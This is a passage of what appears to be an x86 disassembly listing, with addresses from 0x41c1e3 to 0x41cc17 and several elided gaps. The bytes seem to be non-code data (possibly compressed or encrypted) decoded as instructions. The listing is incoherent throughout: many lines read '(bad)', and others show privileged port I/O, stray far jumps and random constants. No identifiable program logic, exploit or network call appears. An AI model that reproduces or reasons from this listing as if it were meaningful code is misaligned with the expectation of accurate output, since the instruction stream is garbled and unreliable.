  41c1e3:	ins    DWORD PTR es:[edi],dx
  41c1e4:	mov    bh,BYTE PTR [esi-0x12c25d24]
  41c1ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1eb:	mov    ah,0x74
  41c1ed:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41c1ef:	pushf  
  41c1f0:	or     DWORD PTR [edi+0x51125368],0x324a6ad4
  41c1fa:	adc    eax,0xa5dbe6d3
  41c1ff:	cmp    al,0xb
  41c201:	or     DWORD PTR [edi+0x17eb2292],esi
  41c207:	or     dl,ah
  41c209:	aam    0x3d
  41c20b:	loop   0x41c1f1
  41c20d:	out    0x99,al
  41c20f:	pop    eax
  41c210:	ja     0x41c282
  41c212:	arpl   cx,di
  41c214:	pop    es
  41c215:	lods   al,BYTE PTR ds:[esi]
  41c216:	mov    al,ds:0x33ff3517
  41c21b:	and    al,0xc0
  41c21d:	add    esp,DWORD PTR [edi-0x5f]
  41c220:	add    eax,0x8b214676
  41c225:	jge    0x41c23b
  41c227:	icebp  
  41c228:	stc    
  41c229:	sbb    DWORD PTR [esi],0xfffffff6
  41c22c:	outs   dx,BYTE PTR ds:[esi]
  41c22d:	bound  ebp,QWORD PTR [ecx-0x3c30d478]
  41c233:	(bad)  
  41c234:	sub    DWORD PTR [esi],0x594d894d
  41c23a:	out    0x75,eax
  41c23c:	out    0x7e,eax
  41c23e:	push   0xef952cd9
  41c243:	out    0x4b,eax
  41c245:	fs dec esi
  41c247:	jmp    0x41c228
  41c249:	ins    DWORD PTR es:[edi],dx
  41c24a:	retf   0x3e1c
  41c24d:	adc    cl,BYTE PTR [ecx+eax*2-0x9]
  41c251:	sbb    dh,BYTE PTR [edi-0x71d604e9]
  41c257:	scas   eax,DWORD PTR es:[edi]
  41c258:	sbb    edi,DWORD PTR [eax-0x672c6869]
  41c25e:	inc    esi
  41c25f:	shl    BYTE PTR [edi],0xcd
  41c262:	outs   dx,BYTE PTR ds:[esi]
  41c263:	and    al,0x49
  41c265:	mov    edx,0xb570dec4
  41c26a:	mov    eax,0xe5727b7f
  41c26f:	fxch   st(4)
  41c271:	mov    BYTE PTR [eax+0x75],bh
  41c274:	or     eax,0xdbc07330
  41c279:	out    dx,al
  41c27a:	sub    al,0x4d
  41c27c:	and    al,0x23
  41c27e:	adc    DWORD PTR [ebx+0xa],edx
  41c281:	xor    ecx,DWORD PTR gs:[eax*4-0x3b486605]
  41c289:	jnp    0x41c22f
  41c28b:	cmp    bl,ch
  41c28d:	xor    BYTE PTR [ebx],0x2
  41c290:	or     al,BYTE PTR [eax]
	...
  41c2f2:	add    BYTE PTR [eax],al
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	mov    es,eax
  41c302:	and    ch,BYTE PTR ds:0x12b94
  41c308:	add    eax,0x5e000001
  41c30d:	and    al,0xcc
  41c30f:	jnp    0x41c350
  41c311:	lea    ecx,[eax]
  41c313:	jns    0x41c2c2
  41c315:	(bad)  
  41c316:	cld    
  41c317:	outs   dx,DWORD PTR ds:[esi]
  41c318:	and    BYTE PTR [esp+esi*4],cl
  41c31b:	xchg   ebx,eax
  41c31c:	adc    ch,cl
  41c31e:	mov    ch,0xd
  41c320:	mov    dh,al
  41c322:	out    0xb5,eax
  41c324:	cli    
  41c325:	jno    0x41c309
  41c327:	inc    ecx
  41c328:	scas   al,BYTE PTR es:[edi]
  41c329:	ret    
  41c32a:	dec    edx
  41c32b:	push   esp
  41c32c:	push   ebp
  41c32d:	xlat   BYTE PTR ds:[ebx]
  41c32e:	pop    edx
  41c32f:	fidiv  DWORD PTR [eax+0x5b]
  41c332:	(bad)  
  41c333:	bound  ebx,QWORD PTR [ebp+0x55]
  41c336:	jp     0x41c378
  41c338:	pop    ds
  41c339:	mov    esp,0x38af6fd8
  41c33e:	fucomip st,st(4)
  41c340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c341:	(bad)  
  41c342:	pop    edx
  41c343:	push   0x32
  41c345:	mov    bh,0xcf
  41c347:	pop    ecx
  41c348:	cmp    BYTE PTR [ebx],al
  41c34a:	add    DWORD PTR [esi+0x38261548],ebx
  41c350:	xchg   edi,eax
  41c351:	ss stc 
  41c353:	jle    0x41c2ee
  41c355:	xor    bl,0x82
  41c358:	mov    bl,0x6b
  41c35a:	inc    edx
  41c35b:	sub    BYTE PTR [edi],cl
  41c35d:	add    BYTE PTR [ecx-0x6d],ah
  41c360:	jle    0x41c312
  41c362:	nop
  41c363:	das    
  41c364:	in     al,dx
  41c365:	add    al,0x7
  41c367:	mov    edx,0xaedb07d8
  41c36c:	mov    cl,0x7d
  41c36e:	es icebp 
  41c370:	ds fcmovnbe st,st(1)
  41c373:	mov    eax,0xe90db893
  41c378:	xchg   edi,eax
  41c379:	sbb    eax,0x7c02b5f9
  41c37e:	or     al,0x6a
  41c380:	push   esi
  41c381:	ficomp WORD PTR [edi+0x40d0400f]
  41c387:	adc    dl,BYTE PTR [esi+0x4b501d97]
  41c38d:	out    dx,al
  41c38e:	inc    edi
  41c38f:	in     eax,dx
  41c390:	jp     0x41c324
  41c392:	pop    esi
  41c393:	xchg   ebx,eax
  41c394:	xchg   esi,eax
  41c395:	icebp  
  41c396:	jne    0x41c35e
  41c398:	jecxz  0x41c413
  41c39a:	xor    DWORD PTR [ecx-0x76],eax
  41c39d:	in     eax,0xf
  41c39f:	adc    DWORD PTR ds:0xf594536e,ebx
  41c3a5:	jmp    0x39e5:0x4165d1
  41c3ac:	outs   dx,BYTE PTR ds:[esi]
  41c3ad:	pushf  
  41c3ae:	mov    esi,es
  41c3b0:	dec    esp
  41c3b1:	in     al,dx
  41c3b2:	pop    ecx
  41c3b3:	xor    BYTE PTR [edi-0x7d7fb9f8],cl
  41c3b9:	pushf  
  41c3ba:	cmp    dh,dh
  41c3bc:	lea    edx,ds:0x6590f8a5
  41c3c2:	lds    ecx,FWORD PTR [esp+edx*8]
  41c3c5:	jbe    0x41c381
  41c3c7:	ins    BYTE PTR es:[edi],dx
  41c3c8:	imul   esi,DWORD PTR [edx+esi*4-0x1f],0x25
  41c3cd:	not    DWORD PTR [ebp-0x556049ec]
  41c3d3:	push   edi
  41c3d4:	cwde   
  41c3d5:	pushf  
  41c3d6:	mov    ah,0x27
  41c3d8:	arpl   WORD PTR [ebp-0x20ccf564],ax
  41c3de:	xor    eax,0x368ecf1d
  41c3e3:	and    ecx,DWORD PTR ds:0xbc05438d
  41c3e9:	sub    eax,0xac135ed6
  41c3ee:	add    dh,dl
  41c3f0:	pop    esp
  41c3f1:	inc    ebp
  41c3f2:	and    eax,0x421d9edb
  41c3f7:	or     eax,0xe1f9e641
  41c3fc:	shr    al,0xb9
  41c3ff:	sub    al,0x7c
  41c401:	adc    edi,DWORD PTR gs:[edx+0x50]
  41c405:	call   0x31267b3f
  41c40a:	imul   ecx,DWORD PTR [eax-0x29961983],0x6a
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	cli    
  41c481:	dec    ebx
  41c482:	push   edi
  41c483:	rcr    BYTE PTR [ecx+0x500012c],0x1
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	lods   eax,DWORD PTR ds:[esi]
  41c48d:	mov    dl,0xf8
  41c48f:	adc    dl,BYTE PTR [edi-0x549483a8]
  41c495:	out    dx,eax
  41c496:	cmp    BYTE PTR ds:0x8da553cf,0x26
  41c49d:	xchg   BYTE PTR [edi],dl
  41c49f:	sub    ah,BYTE PTR [ebx+0xc]
  41c4a2:	mov    dl,0x1
  41c4a4:	(bad)  
  41c4a6:	fs pop eax
  41c4a8:	(bad)  
  41c4a9:	rol    BYTE PTR [ebp-0x7d0913fa],1
  41c4af:	sbb    ebx,DWORD PTR [ecx-0x1f]
  41c4b2:	inc    DWORD PTR [ecx+0x56df1644]
  41c4b8:	inc    ebx
  41c4b9:	lods   al,BYTE PTR ds:[esi]
  41c4ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4bb:	shl    DWORD PTR [edx+0x3a],0xbd
  41c4bf:	dec    esp
  41c4c0:	mov    dl,0x8d
  41c4c2:	push   0x80505109
  41c4c7:	outs   dx,BYTE PTR ds:[esi]
  41c4c8:	xor    BYTE PTR [edi-0x1],bl
  41c4cb:	ins    BYTE PTR es:[edi],dx
  41c4cc:	or     eax,0xa54152bc
  41c4d1:	hlt    
  41c4d2:	mov    al,ds:0x13a72904
  41c4d7:	aas    
  41c4d8:	inc    ebp
  41c4d9:	psadbw mm4,QWORD PTR [ebx+0x6a]
  41c4dd:	out    0xbf,eax
  41c4df:	xor    BYTE PTR [ecx+0x48f46563],bh
  41c4e5:	imul   ebp,DWORD PTR [esi+0x40],0xb074826e
  41c4ec:	icebp  
  41c4ed:	dec    ecx
  41c4ee:	pop    esi
  41c4ef:	jno    0x41c4e0
  41c4f1:	cmp    eax,0x47237b4
  41c4f6:	rcr    BYTE PTR [edx+esi*1+0x7],0xd4
  41c4fb:	add    dl,bh
  41c4fd:	das    
  41c4fe:	xchg   ebp,eax
  41c4ff:	in     eax,dx
  41c500:	daa    
  41c501:	std    
  41c502:	xchg   edi,eax
  41c503:	pop    edi
  41c504:	sbb    al,0xb4
  41c506:	pop    edi
  41c507:	xacquire xchg DWORD PTR [ecx],ebx
  41c50a:	sbb    dl,BYTE PTR ds:0x435467a
  41c510:	mov    edx,0xdb525617
  41c515:	jg     0x41c542
  41c517:	push   0xb13e4314
  41c51c:	mov    BYTE PTR [eax],ah
  41c51e:	xchg   ecx,eax
  41c51f:	mov    WORD PTR [eax+0x36bbbbb5],gs
  41c525:	dec    ecx
  41c526:	(bad)  
  41c527:	pop    edx
  41c528:	push   es
  41c529:	or     cl,cl
  41c52b:	jbe    0x41c4bd
  41c52d:	iret   
  41c52e:	xor    DWORD PTR [edx+0x8],esp
  41c531:	mov    cl,0xac
  41c533:	retf   
  41c534:	pop    esi
  41c535:	sub    ebx,DWORD PTR [edi]
  41c537:	pop    ss
  41c538:	pop    ss
  41c539:	jne    0x41c500
  41c53b:	lock jecxz 0x41c5aa
  41c53e:	cdq    
  41c53f:	mov    edi,0x8154ddb1
  41c544:	lock mov ds:0x8805dd4,al
  41c54a:	in     eax,dx
  41c54b:	mov    dl,0x68
  41c54d:	ds scas eax,DWORD PTR es:[edi]
  41c54f:	in     al,dx
  41c550:	push   ds
  41c551:	test   BYTE PTR [edx+0x19],ch
  41c554:	sbb    esi,esi
  41c556:	mov    ds:0x2015205f,eax
  41c55b:	push   ss
  41c55c:	das    
  41c55d:	or     al,0x3a
  41c55f:	jmp    0x41c4e2
  41c561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c562:	out    dx,al
  41c563:	(bad)  
  41c564:	enter  0x2d57,0x2e
  41c568:	or     eax,0x2c7c2b24
  41c56d:	test   eax,0x9b090d4e
  41c572:	push   eax
  41c573:	popa   
  41c574:	test   al,0x9f
  41c576:	lock ror BYTE PTR [esi-0x41],0x71
  41c57b:	loop   0x41c51d
  41c57d:	mov    ecx,0x8b7f0261
  41c582:	sti    
  41c583:	iret   
  41c584:	jp     0x41c555
  41c586:	mov    eax,esp
  41c588:	and    al,0xa5
  41c58a:	add    DWORD PTR [ebx+0x36883dfb],0xf5
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x5845505
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0x37000001
  41c60d:	iret   
  41c60e:	xchg   cx,ax
  41c610:	test   al,0xa0
  41c612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c613:	add    dl,0xaa
  41c616:	jns    0x41c60b
  41c618:	mov    cl,0x43
  41c61a:	(bad)  
  41c61b:	(bad)  
  41c61c:	fist   WORD PTR [ecx+0x4b405967]
  41c622:	xchg   ecx,eax
  41c623:	test   al,0x69
  41c625:	aad    0x82
  41c627:	sbb    esi,DWORD PTR [edx+0x73dfdb9a]
  41c62d:	je     0x41c68b
  41c62f:	mov    al,0xe4
  41c631:	retf   0xc80e
  41c634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c635:	sbb    edi,eax
  41c637:	cmp    al,BYTE PTR [eax]
  41c639:	jmp    0x41c60b
  41c63b:	sub    bh,BYTE PTR [esi]
  41c63d:	dec    edi
  41c63e:	les    edx,FWORD PTR [esi+0xfe6501b]
  41c644:	xor    ebp,DWORD PTR [eax-0x690ea63]
  41c64a:	loop   0x41c690
  41c64c:	xor    eax,0x8179db91
  41c651:	test   al,0x91
  41c653:	adc    al,0xbe
  41c655:	mov    eax,ds:0x1ba5bee8
  41c65a:	mov    eax,DWORD PTR [ebx+0x627411ae]
  41c660:	aad    0xf0
  41c662:	int3   
  41c663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c664:	pop    ebp
  41c665:	outs   dx,BYTE PTR ds:[esi]
  41c666:	popf   
  41c667:	xchg   ebx,eax
  41c668:	imul   eax,edx
  41c66b:	mov    DWORD PTR ds:0x75161204,esi
  41c671:	fwait
  41c672:	(bad)  
  41c673:	xor    eax,0xb40ddf47
  41c678:	jb     0x41c6b7
  41c67a:	jmp    0x41c676
  41c67c:	lea    esp,[ecx]
  41c67e:	mov    ds:0x3745f60d,al
  41c683:	cld    
  41c684:	mov    dh,0x80
  41c686:	jne    0x41c6e2
  41c688:	scas   al,BYTE PTR es:[edi]
  41c689:	mov    bl,0x2f
  41c68b:	outs   dx,BYTE PTR ds:[esi]
  41c68c:	cmp    eax,0x50aef872
  41c691:	add    ebx,DWORD PTR ds:0x54ce006b
  41c697:	ins    DWORD PTR es:[edi],dx
  41c698:	inc    edx
  41c699:	mov    al,ds:0x6c36bead
  41c69e:	push   0xffffffba
  41c6a0:	lods   eax,DWORD PTR ds:[esi]
  41c6a1:	shl    BYTE PTR [ecx-0xc8c2094],0xa8
  41c6a8:	inc    esp
  41c6a9:	xchg   ebx,eax
  41c6aa:	fisubr WORD PTR [esi-0x5c5987e6]
  41c6b0:	cmp    al,0x58
  41c6b2:	mov    bl,0x83
  41c6b4:	ret    0x1480
  41c6b7:	outs   dx,BYTE PTR ds:[esi]
  41c6b8:	pop    eax
  41c6b9:	inc    ebx
  41c6ba:	retf   0xaa74
  41c6bd:	push   edx
  41c6be:	pop    edi
  41c6bf:	cwde   
  41c6c0:	sbb    DWORD PTR [ebx-0x4c],edi
  41c6c3:	jne    0x41c6d5
  41c6c5:	adc    eax,0x584d152a
  41c6ca:	fwait
  41c6cb:	shl    DWORD PTR [ebx],0x5a
  41c6ce:	imul   BYTE PTR [esi-0x25754624]
  41c6d4:	fldenv [esi-0x49ab6582]
  41c6da:	push   ebp
  41c6db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6dc:	mov    bh,0xf4
  41c6de:	inc    edi
  41c6df:	cmc    
  41c6e0:	dec    esi
  41c6e1:	inc    ebp
  41c6e2:	inc    eax
  41c6e3:	aaa    
  41c6e4:	data16 mov WORD PTR ds:0x9461fe02,?
  41c6eb:	pop    esi
  41c6ec:	xor    ch,BYTE PTR [esi+0x23]
  41c6ef:	test   BYTE PTR [eax+esi*8+0x74],cl
  41c6f3:	cmp    al,0x88
  41c6f5:	mov    cl,0x80
  41c6f7:	push   ss
  41c6f8:	lods   eax,DWORD PTR ds:[esi]
  41c6f9:	jecxz  0x41c690
  41c6fb:	xor    ah,al
  41c6fd:	rcr    DWORD PTR [ebx-0x63],cl
  41c700:	mov    ebx,0x93e99d3d
  41c705:	or     DWORD PTR [eax],0x6aab803d
  41c70b:	das    
  41c70c:	leave  
  41c70d:	jmp    0x0:0xb19c80
	...
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	aaa    
  41c781:	mov    cl,0x25
  41c783:	sti    
  41c784:	mov    ds:0x500012e,eax
  41c789:	add    DWORD PTR [eax],eax
  41c78b:	add    BYTE PTR [edi-0x62981ff],dl
  41c791:	inc    ebx
  41c792:	mov    esp,0x25c61a29
  41c797:	mov    fs,WORD PTR [esi+0x2d]
  41c79a:	out    0xbc,al
  41c79c:	rol    BYTE PTR [edi],0x94
  41c79f:	mov    al,ds:0x6d25b285
  41c7a4:	mov    esi,0xcb5ad312
  41c7a9:	xchg   BYTE PTR [edx-0x4d7b416f],al
  41c7af:	dec    eax
  41c7b0:	mov    esp,0xc761b15f
  41c7b5:	out    0xfe,eax
  41c7b7:	clc    
  41c7b8:	arpl   WORD PTR [edi+ebp*1],si
  41c7bb:	shr    bl,cl
  41c7bd:	or     eax,0x7049e931
  41c7c2:	(bad)  
  41c7c3:	and    dl,BYTE PTR ds:0xda716a8d
  41c7c9:	aaa    
  41c7ca:	add    edx,ecx
  41c7cc:	imul   edi,DWORD PTR [esi+edi*2-0xd6c74a7],0x25
  41c7d4:	push   edi
  41c7d5:	fsubr  DWORD PTR [esi+edx*8+0x1e428c71]
  41c7dc:	or     edx,ebp
  41c7de:	adc    eax,DWORD PTR [ecx-0x5a]
  41c7e1:	push   eax
  41c7e2:	sub    DWORD PTR [eax+0x57],0x5e8ec9b2
  41c7e9:	stos   BYTE PTR es:[edi],al
  41c7ea:	nop
  41c7eb:	or     DWORD PTR [ebp+0x1e5d38f5],esi
  41c7f1:	jmp    0x1289b7cf
  41c7f6:	test   eax,0xbaa866fd
  41c7fb:	push   ds
  41c7fc:	mov    bh,BYTE PTR [eax-0x3b]
  41c7ff:	mov    bh,0x69
  41c801:	mov    cl,0x9f
  41c803:	sbb    al,0x78
  41c805:	push   ebp
  41c806:	aam    0x68
  41c808:	jmp    DWORD PTR [edi*4-0x413a0d86]
  41c80f:	cmp    esp,0xffffffce
  41c812:	jbe    0x41c88f
  41c814:	sbb    DWORD PTR [ecx],edi
  41c816:	call   DWORD PTR [ebx]
  41c818:	das    
  41c819:	adc    DWORD PTR [edx-0x1e823368],0xfffffff3
  41c820:	mov    esp,0x7a7496b8
  41c825:	mov    ds:0x6bcea8b8,eax
  41c82a:	cld    
  41c82b:	inc    eax
  41c82c:	xchg   esi,eax
  41c82d:	js     0x41c84f
  41c82f:	jg     0x41c7eb
  41c831:	les    eax,FWORD PTR [edx+0x30]
  41c834:	fs jo  0x41c889
  41c837:	leave  
  41c838:	push   edi
  41c839:	jg     0x41c7dc
  41c83b:	push   esp
  41c83c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c83d:	jg     0x41c880
  41c83f:	fisttp DWORD PTR ds:0x76054728
  41c845:	icebp  
  41c846:	xchg   DWORD PTR [edx-0x58],edi
  41c849:	stos   BYTE PTR es:[edi],al
  41c84a:	pop    ecx
  41c84b:	add    al,BYTE PTR [ebx+0x11]
  41c84e:	mov    esi,0x51b362d5
  41c853:	sbb    al,0x42
  41c855:	pop    ebp
  41c856:	into   
  41c857:	mov    WORD PTR [ecx+edx*2+0x6fcc7a1d],es
  41c85e:	repz loopne 0x41c874
  41c861:	mov    esp,0x74aada39
  41c866:	ins    BYTE PTR es:[edi],dx
  41c867:	test   DWORD PTR [eax-0x3a6894b2],eax
  41c86d:	lahf   
  41c86e:	push   ecx
  41c86f:	adc    cl,dl
  41c871:	fwait
  41c872:	pop    esp
  41c873:	sub    DWORD PTR [edx+edx*1+0x72ee3591],esp
  41c87a:	sbb    ch,BYTE PTR [edi]
  41c87c:	pop    eax
  41c87d:	cmp    BYTE PTR [esp+eiz*4+0x6e],0x65
  41c882:	retf   
  41c883:	sub    BYTE PTR [ecx+edx*1+0x11372192],dl
  41c88a:	imul   esp,DWORD PTR ds:0xc534081f,0xffffffa7
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	pop    eax
  41c901:	inc    edi
  41c902:	xor    DWORD PTR [esi],edx
  41c904:	test   al,0x2f
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    eax,0xa2000001
  41c90d:	(bad)  
  41c90e:	ins    DWORD PTR es:[edi],dx
  41c90f:	inc    eax
  41c910:	jmp    0xa04f:0xc7f634db
  41c917:	jnp    0x41c8f1
  41c919:	or     al,0x27
  41c91b:	daa    
  41c91c:	mov    ch,0x2a
  41c91e:	ja     0x41c908
  41c920:	xchg   esi,eax
  41c921:	sub    BYTE PTR [ebx],dl
  41c923:	repz lahf 
  41c925:	mov    DWORD PTR [ebx+0xd917969],ebx
  41c92b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c92c:	stos   DWORD PTR es:[edi],eax
  41c92d:	mov    ds:0x3e93df9a,al
  41c932:	add    ebp,esi
  41c934:	lock inc esi
  41c937:	mov    ds:0x980f4657,eax
  41c93c:	mov    al,0x51
  41c93e:	shl    BYTE PTR [edx],1
  41c940:	cmp    dh,ah
  41c942:	xor    ah,bl
  41c944:	add    DWORD PTR [ebp-0x5c],esi
  41c947:	inc    esi
  41c948:	pop    ebx
  41c949:	repz sub ch,cl
  41c94c:	fcmovbe st,st(7)
  41c94e:	popf   
  41c94f:	cmp    BYTE PTR [ebx+0x74],bh
  41c952:	shr    dh,0x29
  41c955:	and    eax,0x63866d60
  41c95a:	cmp    ch,dh
  41c95c:	inc    ebx
  41c95d:	(bad)  
  41c95e:	popa   
  41c95f:	in     eax,dx
  41c960:	cmp    ebp,eax
  41c962:	call   0x77815c45
  41c967:	mov    esp,DWORD PTR ds:0x970481f1
  41c96d:	fs sub eax,0xf8e26bcf
  41c973:	loopne 0x41c944
  41c975:	retf   0x5d28
  41c978:	sub    BYTE PTR [ebp+0x9f1e057],dh
  41c97e:	shl    DWORD PTR [esi],cl
  41c980:	arpl   WORD PTR [eax],ax
  41c982:	xlat   BYTE PTR ds:[ebx]
  41c983:	lahf   
  41c984:	or     DWORD PTR [edi],ebx
  41c986:	test   DWORD PTR [edi+0x4a0fc4f7],ecx
  41c98c:	out    dx,al
  41c98d:	jno    0x41c9ee
  41c98f:	add    ebp,ebx
  41c991:	(bad)  
  41c992:	mov    edx,0x6adce927
  41c997:	or     al,0x3f
  41c999:	mov    WORD PTR [ecx-0x7f],?
  41c99c:	pop    ebx
  41c99d:	(bad)  
  41c99e:	fsub   DWORD PTR [eax-0x4f0d3a51]
  41c9a4:	add    dl,BYTE PTR [edi+esi*8+0x5]
  41c9a8:	sbb    al,0x72
  41c9aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9ab:	fmul   QWORD PTR [ebp-0x224665ae]
  41c9b1:	push   esi
  41c9b2:	test   DWORD PTR [ebx-0x51039e4],esp
  41c9b8:	jp     0x41c9e8
  41c9ba:	fmulp  st(0),st
  41c9bc:	retf   0xa29f
  41c9bf:	call   0x97a9:0x11f0a5fb
  41c9c6:	adc    al,0xff
  41c9c8:	mov    ah,0x11
  41c9ca:	mov    ecx,DWORD PTR [ebp-0x1]
  41c9cd:	ror    al,1
  41c9cf:	xchg   ebp,eax
  41c9d0:	lock push cs
  41c9d2:	xchg   edi,eax
  41c9d3:	xchg   ebp,eax
  41c9d4:	cld    
  41c9d5:	dec    edx
  41c9d6:	(bad)  
  41c9d7:	ss pop ss
  41c9d9:	ss jae 0x41c9a5
  41c9dc:	imul   ebp,DWORD PTR [ebp+0x708c02cb],0x2cade6c2
  41c9e6:	cmp    eax,0xfe910b2b
  41c9eb:	lea    ebx,[ebx-0x4f1006cb]
  41c9f1:	push   es
  41c9f2:	inc    edx
  41c9f3:	call   0x9ceb:0xb33e4a7
  41c9fa:	or     ebp,edx
  41c9fc:	pavgb  mm3,QWORD PTR [ebx+0x10]
  41ca00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca01:	fcomip st,st(4)
  41ca03:	imul   ecx,DWORD PTR [edi],0xb9aa41d5
  41ca09:	into   
  41ca0a:	in     eax,dx
  41ca0b:	cmp    BYTE PTR [esi],ch
  41ca0d:	(bad)  
  41ca0f:	mov    DWORD PTR [esi],ebp
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	jmp    0x41caca
  41ca82:	aas    
  41ca83:	out    0xad,eax
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0xc6000001,al
  41ca8d:	xchg   esp,eax
  41ca8e:	mov    ebp,DWORD PTR [ebp-0x76]
  41ca91:	add    al,0x7d
  41ca93:	cld    
  41ca94:	pop    ebp
  41ca95:	(bad)  
  41ca96:	rcl    BYTE PTR [edx],1
  41ca98:	test   bh,0xa9
  41ca9b:	adc    bl,BYTE PTR [ebp+ecx*1+0x24]
  41ca9f:	fsubp  st(0),st
  41caa1:	push   edx
  41caa2:	fst    st(3)
  41caa4:	cmp    BYTE PTR [esi-0x14],0x4a
  41caa8:	leave  
  41caa9:	iret   
  41caaa:	pop    es
  41caab:	ror    DWORD PTR [edi-0x49925fec],cl
  41cab1:	dec    ebx
  41cab2:	in     al,dx
  41cab3:	mov    cl,dh
  41cab5:	mov    edi,0xc50b55f6
  41caba:	and    dh,BYTE PTR [ecx+eax*2]
  41cabd:	adc    bl,0x31
  41cac0:	sbb    DWORD PTR [edx+0x5f],0x41
  41cac4:	inc    eax
  41cac5:	jl     0x41cb2c
  41cac7:	(bad)
  41cacb:	sub    DWORD PTR gs:[esp+eiz*2-0x6b64d37b],esi
  41cad3:	push   cs
  41cad4:	in     al,dx
  41cad5:	add    bh,BYTE PTR [ebp+esi*2+0x7c77841]
  41cadc:	sbb    al,0x82
  41cade:	fs cmc 
  41cae0:	xor    BYTE PTR [esi+ebp*1-0x63],bl
  41cae4:	ret    0x4db0
  41cae7:	jmp    0x869b7fa2
  41caec:	mov    BYTE PTR [edi],cl
  41caee:	sar    BYTE PTR [ebx],0x7a
  41caf1:	(bad)  
  41caf2:	loopne 0x41ca82
  41caf4:	int    0xe0
  41caf6:	lock pop ss
  41caf8:	test   al,0x7
  41cafa:	dec    edi
  41cafb:	cmp    edx,edx
  41cafd:	clc    
  41cafe:	pop    es
  41caff:	push   ebp
  41cb00:	mov    ebp,0x8e3bb686
  41cb05:	jp     0x41cb54
  41cb07:	aam    0xfa
  41cb09:	push   ds
  41cb0a:	xadd   BYTE PTR ds:0xc364d4c9,dh
  41cb11:	fs xchg eax,edi
  41cb14:	bswap  ebp
  41cb16:	and    esi,esi
  41cb18:	xor    DWORD PTR [esi],edi
  41cb1a:	cs scas eax,DWORD PTR es:[edi]
  41cb1c:	(bad)  
  41cb1d:	sti    
  41cb1e:	xlat   BYTE PTR ds:[ebx]
  41cb1f:	cmp    al,bl
  41cb21:	jl     0x41cb14
  41cb23:	es sub al,0x3d
  41cb26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb27:	dec    ecx
  41cb28:	adc    eax,0xf4f94098
  41cb2d:	jb     0x41caf9
  41cb2f:	mov    DWORD PTR [eax-0x43],0xbbe47c9f
  41cb36:	std    
  41cb37:	(bad)  
  41cb38:	sub    al,0xe3
  41cb3a:	mov    edx,DWORD PTR [esi]
  41cb3c:	adc    ebx,ebp
  41cb3e:	bound  edi,QWORD PTR [eax+0x2fbb2bda]
  41cb44:	jg     0x41cb20
  41cb46:	mov    edx,ecx
  41cb48:	or     esp,DWORD PTR [eax+0x65]
  41cb4b:	adc    al,BYTE PTR [esi]
  41cb4d:	ja     0x41cb04
  41cb4f:	dec    edi
  41cb50:	fnstenv [ebx-0x3a]
  41cb53:	mov    ds:0x16bc6d3e,eax
  41cb58:	je     0x41cbab
  41cb5a:	shl    BYTE PTR [eax+0x4d92a3f0],0x34
  41cb61:	or     BYTE PTR [esi+0x1b57028a],bl
  41cb67:	sbb    ch,BYTE PTR es:[esi-0x2f]
  41cb6b:	imul   eax,DWORD PTR [eax+0x6e2204ed],0xc671dd96
  41cb75:	bound  edx,QWORD PTR [esi+ecx*1]
  41cb78:	and    dl,BYTE PTR [edx+0x50]
  41cb7b:	jl     0x41cbbe
  41cb7d:	and    al,0xb1
  41cb7f:	fs jne 0x41cb29
  41cb82:	push   ss
  41cb83:	test   eax,0xeb733acb
  41cb88:	sbb    al,0xda
  41cb8a:	mov    eax,ds:0x6cef7385
  41cb8f:	daa    
  41cb90:	sahf   
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xb26cc822
  41cc03:	popf   
  41cc04:	mov    dl,0x31
  41cc06:	add    DWORD PTR [eax],eax
  41cc08:	add    eax,0xf9000001
  41cc0d:	inc    ebx
  41cc0e:	mov    ebp,0xf38cdb68
  41cc13:	sbb    al,0x19
  41cc15:	dec    ebp
  41cc16:	push   edi
  41cc17:	leave  
